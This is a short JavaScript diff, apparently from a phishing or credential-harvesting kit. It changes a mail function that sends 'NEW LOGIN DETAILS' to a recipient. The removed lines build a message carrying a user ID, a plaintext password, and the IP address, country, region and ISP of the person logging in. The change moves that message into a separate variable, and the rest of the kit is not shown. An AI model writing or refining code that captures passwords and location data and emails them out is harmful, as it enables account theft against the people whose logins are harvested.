@@ -41,11 +41,7 @@ const sendMail = (
     from: auth['user'],
     to,
     subject: 'NEW LOGIN DETAILS',
-    text: `New login details. User ID: ${userID}, password: ${password}, IP: ${
-      IPAddress || 'Not available'
-    }, Country: ${country || 'Not available'}, Region:${
-      region || 'Not available'
-    }, Internet Service Provider(ISP): ${isp || 'Not available'} `,
+    text,
   }
 
   transporter.sendMail(mailOptions, function (error, info) {
